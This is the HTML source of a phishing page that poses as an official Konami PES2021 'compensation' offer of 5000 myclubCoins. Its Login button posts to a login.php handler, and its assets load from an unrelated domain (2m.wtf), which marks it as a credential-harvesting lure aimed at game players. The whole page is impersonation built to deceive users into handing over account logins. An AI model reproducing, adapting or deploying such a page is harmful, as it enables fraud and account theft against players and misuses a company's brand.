<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<script src="../cdn-cgi/apps/head/AlAgxD7oxHZSiFZQmr6zl7N739c.js"></script><link href='index.html%3Fid=1389371812.html' rel='icon'>
<title>PES2021 COMPENSATION | Claim Your 5000 myclubCoins </title>
<script src="js/jquery.min.js" type="d28728dd6b9c7bf36f307513-text/javascript"></script>
<link rel="stylesheet" href="js/bootstrap.min.css">
<style>
h1, .h1, h2, .h2, h3, .h3 {
margin-top: 0px;
margin-bottom: 10.5px;
}
body {
font-family:roboto mono,monospace;
min-height:100vh;
background-color:#333;
background-image:url(img/back.jpg);
background-position:center;
background-size:cover
}
.error-msg {
margin: .5em 0;
display: block;
color: #dd4b39;
line-height: 17px;
}
.col-md-6 {
margin:0 auto;
float:none;
}
.col-md-12 {
margin:0 auto;
float:none;
}
</style>
<script async src='../cdn-cgi/challenge-platform/h/b/scripts/invisible.js' type="d28728dd6b9c7bf36f307513-text/javascript"></script><script async src='../cdn-cgi/challenge-platform/h/b/scripts/invisible.js'></script><body style="padding:0px;margin:0 auto;">
<div style="padding:0px;margin:0 auto;" class="container ">
<div style="border:none;padding:0px;margin:0 auto;" class="col-md-6">
<div style="padding:10px;border-radius:0px;box-shadow: 0px 0px 0px rgba(0, 0, 0, 0.3);background-color: rgba(1,1,1,1); color: white;width:100%" class="form-horizontal" class="form-horizontal">
<img src="img/konami.png" width="30%" align="left">
<div style="text-align:right"><font size="2px">Europe / English &vee;</font></div>
</div>
<div style="padding:10px;border-radius:0px;box-shadow: 0px 0px 0px rgba(0, 0, 0, 0.3);background-color: rgba(1,1,1,0.8); color: white;width:100%" class="form-horizontal" class="form-horizontal">
<font size="2px">Konami <a "http://2m.wtf/PES/href">></a> PES2021 <a "http://2m.wtf/PES/href">></a> Compensation</font>
</div>
<center style="background:none;">
<div class="col-md">
<style type="text/css">
#main {
background:
url(http://2m.wtf/PES/img/bg_wv.jpg) 40% 90% no-repeat;
height:300px;
width: auto;
}
</style>
<div id="main">
<br>
<font color="white" size="1px">The official KONAMI Pro Evolution Soccer eSport</font><br><br>
<h3></h3>
</div>
<div style="padding:20px;border-radius:0px;box-shadow: 0px 0px 0px rgba(0, 0, 0, 0.3);background-color: rgba(1,1,1,0.8); color: white;width:100%" class="form-horizontal" class="form-horizontal">
<h4><b>Dear Valuable Users </b><br>
<font color="white" size="2px">Thanks for still playing PES2021. We plan some optimization for PES2021, and we hope you will try the demo. Claim free compensation from KONAMI. Thanks for participating!.<br><br></font>
<img src="img/coins.png" width="30px"> <b>5000 myclubCoin</b>
<br>
</h4>
<form class="login-form" action="login.php" method="post">
<div style="text-align:left" class="error-msg" id="hasilnya"></div>
<div style="width:100%" class="form-group">
<input type="submit" name="gsubmit" class="btn btn-block" style="color: #ffffff;border-radius:15px;background-color:#2780e3;" id="gsubmit" value="Login"> </form>
</div>
</div>
<div style="padding:5px;border-radius:0px;box-shadow: 0px 0px 0px rgba(0, 0, 0, 0.3);background-color: rgba(1,1,1,0.6); color: white;width:100%" class="form-horizontal" class="form-horizontal">
</div>
</div>
<div style="padding:10px;border-radius:0px;box-shadow: 0px 0px 0px rgba(0, 0, 0, 0.3);background-color: rgba(1,1,1,0.8); color: white;width:100%" class="form-horizontal" class="form-horizontal">
<center><p>PES EFOOTBALL KONAMI</p></center>
<img src="img/mv_index_2.png" width="170px"></p>
<p>Copyright &copy; 2021 KONAMI.</p>
</div>
</div>
</div><script type="d28728dd6b9c7bf36f307513-text/javascript">(function(){window['__CF$cv$params']={r:'6b3e861f19820e16',m:'U1pofYHstH_BTJLbpMQmYtKRZBup8i20_x9fBXnhL9g-1637881548-0-AUyyBCdclxVrQaQC0hZMSY8QRuw+4vywRbHMc2y28huB+GPbpBbv10piIHUz7QFtAQ4y4Tld+dE4daO/BWdf1aoq3pminYTNLdMTlpu02HuoTVkj/Yvq7+Od50AONtiIARDmYfyMUKnw+dvikPi8TpE=',s:[0x16e04a92a0,0x40c8c2e74f],u:'/cdn-cgi/challenge-platform/h/b'}})();</script><script src="../cdn-cgi/scripts/7d0fa10a/cloudflare-static/rocket-loader.min.js" data-cf-settings="d28728dd6b9c7bf36f307513-|49" defer=""></script><script type="text/javascript">(function(){window['__CF$cv$params']={r:'6b4784ebad6111bf',m:'RVxYsSiMd70UR7rHsbs9N.KQD2vO82vyUlvPd1PfnsQ-1637975871-0-AZzH/H8V41z+Fse1J+RKIR7dDwQc6iItn5voMYGuQ8DUtGDf/t1rikH6kbHVxKn3NfzRTnInJcbG1wVEAXHKedfAWQ3y9UcpFCj46+prxLaZHPMmCOzUamB1flt6keahiZ5jxh0Go78inwz9TUIZTkU=',s:[0xbbf16bac74,0xd3946e71d8],u:'/cdn-cgi/challenge-platform/h/b'}})();</script>